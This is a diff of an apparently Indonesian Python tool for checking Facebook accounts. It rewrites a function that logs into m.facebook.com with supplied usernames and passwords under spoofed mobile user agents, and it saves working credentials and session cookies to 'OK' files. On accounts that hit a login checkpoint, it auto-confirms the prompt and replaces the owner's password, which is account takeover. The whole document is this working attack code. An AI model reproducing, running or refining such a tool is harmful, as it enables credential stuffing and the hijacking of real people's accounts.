@@ -2041,134 +2041,102 @@ def kontolll():
  konton = f"Mozilla/5.0 (Linux; Android 11; {str(rr(3,9))}.{str(rr(0,1))}.1; M2010J19SY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(40,99))}.0.{str(rr(2300,2900))}.{str(rr(75,150))} Mobile Safari/537.36"
  return random.choice([konton])
 
+import requests
+import re
+from bs4 import BeautifulSoup
+
 def mengecek(user, pw):
     global loop, ubah_pass, pwbaru
-    session = requests.Session()
-    ua = kontolll()
-    url = "https://mbasic.facebook.com"
-    session.headers.update(
-        {
-            "Host": "mbasic.facebook.com",
-            "cache-control": "max-age=0",
-            "upgrade-insecure-requests": "1",
-            "origin": "https://mbasic.facebook.com",
-            "content-type": "application/x-www-form-urlencoded",
-            "user-agent": ua,
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-            "x-requested-with": "mark.via.gp",
-            "sec-fetch-site": "same-origin",
-            "sec-fetch-mode": "navigate",
-            "sec-fetch-user": "?1",
-            "sec-fetch-dest": "document",
-            "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8",
-            "accept-encoding": "gzip, deflate",
-            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-        }
-    )
-    soup = bs4.BeautifulSoup(
-        session.get(url + "/login/?next&ref=dbl&fl&refid=8").text, "html.parser"
-    )
-    link = soup.find("form", {"method": "post"})
-    for x in soup("input"):
-        data.update({x.get("name"): x.get("value")})
-    data.update({"email": user, "pass": pw})
-    urlPost = session.post(url + link.get("action"), data=data)
-    response = bs4.BeautifulSoup(urlPost.text, "html.parser")
-    if "c_user" in session.cookies.get_dict():
-        if "Akun Anda Dikunci" in urlPost.text:
-            print("\r%s%s\033[0m akun terkunci sesi new" % (M, til))
-        else:
-            print(
-                "\r%s%s\033[0m akun tidak checkpoint, silahkan anda login " % (til, H)
-            )
-            open("OK/OK-%s.txt" % (day), "a").write(" %s|%s\n" % (user, pw))
-    elif "checkpoint" in session.cookies.get_dict():
-        coki = (";").join(
-            [
-                "%s=%s" % (key, value)
-                for key, value in session.cookies.get_dict().items()
-            ]
-        )
-        title = re.findall("\<title>(.*?)<\/title>", str(response))
-        link2 = response.find("form", {"method": "post"})
-        listInput = ["fb_dtsg", "jazoest", "checkpoint_data", "submit[Continue]", "nh"]
-        for x in response("input"):
-            if x.get("name") in listInput:
-                data2.update({x.get("name"): x.get("value")})
-        an = session.post(url + link2.get("action"), data=data2)
-        response2 = bs4.BeautifulSoup(an.text, "html.parser")
-        cek = [cek.text for cek in response2.find_all("option")]
-        number = 0
-        print(
-            "\r%s%s \033[0m [+] Terdapat %s%s%s \033[0mOpsi %s:"
-            % (U, O, P, str(len(cek)), O, M)
-        )
-        jeda(0.07)
-        if len(cek) == 0:
-            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
-                if "ubah_sandi" in ubah_pass:
-                    dat, dat2 = {}, {}
-                    but = ["submit[Yes]", "nh", "fb_dtsg", "jazoest", "checkpoint_data"]
-                    for x in response("input"):
-                        if x.get("name") in but:
-                            dat.update({x.get("name"): x.get("value")})
-                    ubahPw = session.post(url + link2.get("action"), data=dat).text
-                    resUbah = bs4.BeautifulSoup(ubahPw, "html.parser")
-                    link3 = resUbah.find("form", {"method": "post"})
-                    but2 = ["submit[Next]", "nh", "fb_dtsg", "jazoest"]
-                    if "Buat Kata Sandi Baru" in re.findall(
-                        "\<title>(.*?)<\/title>", str(ubahPw)
-                    ):
-                        for b in resUbah("input"):
-                            dat2.update({b.get("name"): b.get("value")})
-                        dat2.update({"password_new": "".join(pwbaru)})
-                        an = session.post(url + link3.get("action"), data=dat2)
-                        coki = (";").join(
-                            [
-                                "%s=%s" % (key, value)
-                                for key, value in session.cookies.get_dict().items()
-                            ]
-                        )
-                        print(
-                            "\r%s%s\033[0makun one tab, sandi berhasil di ubah \n OK %s%s%s|%s|%s			"
-                            % (H, til, N, H, user, pwbaru[0], coki)
-                        )
-                        open("OK/OK-%s.txt"%(day), "a").write(
-                            "%s%s|%s|%s\n"%(H, user, pwbaru[0], coki)
-                        )
-                else:
-                    print("\r%s%s \033[0m\x1b[1;92mCheckpoint Terbuka, Akun Tap Yes Silahkan Login		"%(H, til))
-                    tree = Tree(" ", guide_style=f"{color_ok}")
-                    tree.add(Panel(f"{ua}", width=60, style=f"{color_ok}"))
-                    prints(tree)
-                    open("OK/OK-%s.txt"%(day), "a").write(
-                        "%s %s|%s|%s\n"%(H, user, pw, coki)
-                    )
-            elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>", str(response)):
-                print("\r %s \33[31;1m akun terpasang autentikasi dua faktor			"%(M))
-            else:
-                print("%s%s\033[0m terjadi kesalahan"%(M, til))
-        else:
-            if "c_user" in session.cookies.get_dict():
-                print("\r%s akun tidak checkpoint, silahkan anda login "%(H))
-                open("OK/OK-%s.txt"%(day), "a").write("%s%s|%s\n"%(H, user, pw))
-        for opsi in range(len(cek)):
-            number += 1
-            jalan("  %s%s. %s%s"%(P, str(number), K, cek[opsi]))
-    elif "login_error" in str(response):
-        oh = response.find("div", {"id": "login_error"}).find("div").text
-        print("%s %s"%(M, oh))
-    else:
-        tree = Tree(" ", guide_style=f"bold white")
-        tree.add(
-            Panel(
-                f"{P2}login gagal, silahkan cek kembali id dan kata sandi",
-                width=60,
-                style=f"{color_panel}",
-            )
-        )
-        prints(tree)
 
+    # Inisialisasi sesi
+    session = requests.Session()
+    url = "https://m.facebook.com"
+    session.headers.update({
+        "Host": "m.facebook.com",
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+        "accept-encoding": "gzip, deflate",
+        "accept-language": "id-ID,id;q=0.9",
+        "referer": "https://mbasic.facebook.com/",
+        "user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
+    })
+
+    try:
+        # Ambil halaman login awal
+        soup = BeautifulSoup(session.get(f"{url}/login/?next&ref=dbl&fl&refid=8").text, "html.parser")
+        link = soup.find("form", {"method": "post"})
+
+        # Ambil semua input form
+        data = {}
+        for x in soup.find_all("input"):
+            if x.get("name"):
+                data[x.get("name")] = x.get("value")
+        data.update({"email": user, "pass": pw})
+
+        # Kirim permintaan login
+        urlPost = session.post(url + link.get("action"), data=data)
+        response = BeautifulSoup(urlPost.text, "html.parser")
+
+        # Cek status login
+        cookies = session.cookies.get_dict()
+        if "c_user" in cookies:
+            if "Akun Anda Dikunci" in urlPost.text:
+                print("\r%s%s\033[0m Akun Terkunci Sesi Baru" % (P, til))
+            else:
+                print("\r%s%s\033[0m Akun Tidak Checkpoint, Silahkan Login" % (til, P))
+                open(f'OK/OK-{waktu}.txt', 'a').write(" %s|%s\n" % (user, pw))
+
+        elif "checkpoint" in cookies:
+            coki = ";".join([f"{key}={value}" for key, value in cookies.items()])
+            title = response.title.string
+            link2 = response.find("form", {"method": "post"})
+            data2 = {}
+
+            # Ambil input untuk form checkpoint
+            listInput = ['fb_dtsg', 'jazoest', 'checkpoint_data', 'submit[Continue]', 'nh']
+            for x in response.find_all("input"):
+                if x.get("name") in listInput:
+                    data2[x.get("name")] = x.get("value")
+
+            an = session.post(url + link2.get("action"), data=data2)
+            response2 = BeautifulSoup(an.text, "html.parser")
+            cek = [cek.text for cek in response2.find_all("option")]
+
+            print("\r%s [+] %s\033[0m terdapat %s opsi:" % (P, P, len(cek)))
+            if len(cek) == 0:
+                if "Lihat Detail Login Yang Ditampilkan. Ini Anda?" in title:
+                    if "ubah_sandi" in ubah_pass:
+                        # Ubah sandi jika diizinkan
+                        dat, dat2 = {}, {}
+                        but = ["submit[Yes]", "nh", "fb_dtsg", "jazoest", "checkpoint_data"]
+                        for x in response.find_all("input"):
+                            if x.get("name") in but:
+                                dat[x.get("name")] = x.get("value")
+                        ubahPw = session.post(url + link2.get("action"), data=dat).text
+                        resUbah = BeautifulSoup(ubahPw, "html.parser")
+                        link3 = resUbah.find("form", {"method": "post"})
+                        if "Buat Kata Sandi Baru" in resUbah.title.string:
+                            for b in resUbah.find_all("input"):
+                                dat2[b.get("name")] = b.get("value")
+                            dat2["password_new"] = "".join(pwbaru)
+                            session.post(url + link3.get("action"), data=dat2)
+                            print(f"\r{P}{til}\033[0m Akun One Tab, Sandi Berhasil Diubah")
+                    else:
+                        print("\r%s%s \033[0m Akun One Tab, Silahkan Login" % (P, til))
+                elif "Masukkan Kode Masuk untuk Melanjutkan" in title:
+                    print("\r%s [+] \033[0m Akun Menggunakan Autentikasi Dua Faktor" % P)
+            for opsi, teks in enumerate(cek, start=1):
+                print(f"  {opsi}. {teks}")
+
+        elif "login_error" in response.text:
+            oh = response.find("div", {"id": "login_error"}).find("div").text
+            print(f"%s [+] {oh}")
+        else:
+            print("%s [+] \033[0m Login Gagal, Silahkan Cek Kembali ID dan Kata Sandi" % P)
+
+    except requests.exceptions.RequestException as e:
+        print(f"[bold red]Error koneksi:[/bold red] {e}")
+    except Exception as e:
+        print(f"[bold red]Kesalahan tidak terduga:[/bold red] {e}")
 
 def scarpping_ua():
     uascrap = []
